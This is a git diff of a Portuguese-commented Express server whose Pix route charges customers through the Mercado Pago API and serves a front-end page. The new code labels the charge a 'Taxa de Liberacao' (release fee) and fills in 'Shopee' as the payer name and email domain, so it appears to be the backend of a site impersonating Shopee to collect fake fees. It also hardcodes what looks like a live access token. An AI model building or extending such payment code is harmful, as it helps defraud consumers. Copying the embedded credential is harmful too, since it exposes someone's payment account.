@@ -1,68 +1,70 @@
 import express from 'express';
 import cors from 'cors';
 import axios from 'axios';
+import path from 'path';
 
 const app = express();
+
 app.use(express.json());
 app.use(cors({ origin: '*' }));
 
-// Rota de Teste Simples
+// === AQUI ESTÁ A CORREÇÃO ===
+// Diz para o servidor procurar arquivos (como index.html) na pasta raiz
+app.use(express.static(path.join(__dirname, '../')));
+
+// Quando acessar o site, entrega o index.html
 app.get('/', (req, res) => {
-    res.send('Servidor em Modo Diagnóstico: ON');
+    res.sendFile(path.join(__dirname, '../index.html'));
 });
 
-// === ROTA DO PIX (MODO DEBUG) ===
+// === ROTA DO PIX (MERCADO PAGO) ===
 app.post('/pix', async (req, res) => {
-    console.log("------------------------------------------------");
-    console.log("🔍 [DIAGNOSTICO] Recebendo pedido de Pix...");
-    console.log("📦 Dados recebidos do Front:", JSON.stringify(req.body));
-
-    const { amount, name, cpf, email } = req.body;
-    const ACCESS_TOKEN = 'APP_USR-2572776399339396-020516-e4fefa77579bb50393285e683713d789-232650059';
-
+    console.log("🔹 [PIX] Recebido pedido de:", req.body.name);
+    
     try {
-        // Preparando dados (Hardcoded para teste se necessário, mas usando variáveis)
+        const { amount, name, cpf, email } = req.body;
+        
+        // Prepara dados
         const payload = {
-            transaction_amount: Number(amount) || 37.90, // Garante numero
-            description: "Taxa Teste",
+            transaction_amount: Number(amount) || 37.90,
+            description: "Taxa de Liberacao",
             payment_method_id: "pix",
             payer: {
-                email: email || "teste@diagnostico.com",
-                first_name: String(name).split(' ')[0] || "Debug",
-                last_name: "User",
+                // Email é OBRIGATÓRIO no MP. Se não tiver, usamos um genérico.
+                email: (email && email.includes('@')) ? email : "pagamento@shopee.com",
+                first_name: String(name).split(' ')[0] || "Cliente",
+                last_name: "Shopee",
                 identification: {
                     type: "CPF",
-                    number: String(cpf).replace(/\D/g, '') // Remove pontuacao
+                    number: String(cpf).replace(/\D/g, '') // Limpa o CPF
                 }
             }
         };
 
-        console.log("🚀 Enviando para Mercado Pago:", JSON.stringify(payload));
+        const ACCESS_TOKEN = 'APP_USR-2572776399339396-020516-e4fefa77579bb50393285e683713d789-232650059';
 
         const response = await axios.post('https://api.mercadopago.com/v1/payments', payload, {
             headers: {
                 'Authorization': `Bearer ${ACCESS_TOKEN}`,
                 'Content-Type': 'application/json',
-                'X-Idempotency-Key': `debug-${Date.now()}` // Chave unica simples
+                'X-Idempotency-Key': `pay-${Date.now()}`
             }
         });
 
-        console.log("✅ SUCESSO! ID:", response.data.id);
+        console.log("✅ Pix Gerado ID:", response.data.id);
         res.status(201).json(response.data);
 
     } catch (error: any) {
-        console.log("❌ ============ ERRO CAPTURADO ============");
+        // Se der erro, mostra no log o motivo exato
+        const msgErro = error.response?.data?.message || error.message;
+        console.error("❌ ERRO MP:", JSON.stringify(error.response?.data, null, 2));
         
-        if (error.response) {
-            // O Mercado Pago respondeu com um erro (AQUI ESTÁ A RESPOSTA)
-            console.log("⚠️ Status HTTP:", error.response.status);
-            console.log("⚠️ RESPOSTA DETALHADA MP:", JSON.stringify(error.response.data, null, 2));
-            
-            // Devolvemos isso para o navegador ver
-            res.status(error.response.status).json({
-                erro_tipo: "MercadoPago_Recusou",
-                mensagem_original: error.response.data
-            });
-        } else {
-            // Erro de conexão ou código
-            console.log("⚠️ Erro Intern
+        res.status(500).json({ 
+            error: "Falha no Mercado Pago", 
+            detalhes: msgErro 
+        });
+    }
+});
+
+const PORT = Number(process.env.PORT) || 10000;
+app.listen(PORT, '0.0.0.0', () => console.log(`🚀 Servidor rodando na porta ${PORT}`));
